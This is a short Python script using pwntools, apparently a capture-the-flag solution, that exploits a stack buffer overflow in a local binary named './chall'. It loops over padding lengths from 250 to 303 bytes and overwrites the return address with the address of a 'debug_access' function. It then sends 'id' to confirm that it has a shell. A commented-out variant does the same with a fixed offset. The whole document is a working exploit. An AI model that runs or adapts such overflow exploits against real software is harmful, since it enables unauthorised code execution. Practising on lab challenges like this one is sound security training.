from pwn import *

# bufsize = 0x100
# print(bufsize)

# shell = ELF('./chall')
# shell_funct_addr = shell.symbols['debug_access']

# p = process("./chall")

# payload = fit({
#     bufsize: p64(shell_funct_addr),
# })

# log.info("Sending payload : %r" % payload)
# p.send(payload)
# p.interactive()

# we loop on the length of the payload until it crashes
for i in range(250, 304):
    try:
        print(i)
        # we go back into the homedir to execute the "real" challenge binary
        p = process("./chall")

        # find the address of `callMeMaybe`
        callMeMaybe = p64(p.elf.symbols["debug_access"])
        payload = b"A"*(i) + callMeMaybe
        p.sendline(payload)
        p.clean()
        p.sendline(b"id")
        print(p.recvline())
    except:
        pass
